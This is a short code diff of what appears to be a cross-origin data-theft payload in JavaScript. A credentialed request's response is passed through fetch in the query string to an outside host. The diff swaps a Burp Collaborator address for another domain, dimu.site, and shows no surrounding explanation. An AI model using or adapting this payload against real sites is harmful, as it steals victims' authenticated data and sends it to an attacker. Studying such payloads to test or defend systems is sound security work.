@@ -5,7 +5,7 @@ req.withCredentials = true;
 req.send();
 
 function reqListener() {
-    fetch(('https://q4vjpxn55uu0ig5ejl8w4k7z7qdi1bp0.oastify.com/?xxx='+this.responseText))
+    fetch(('http://dimu.site/?xxx='+this.responseText))
     .then(res => res.json())
     .then(data => console.log(data))
 };
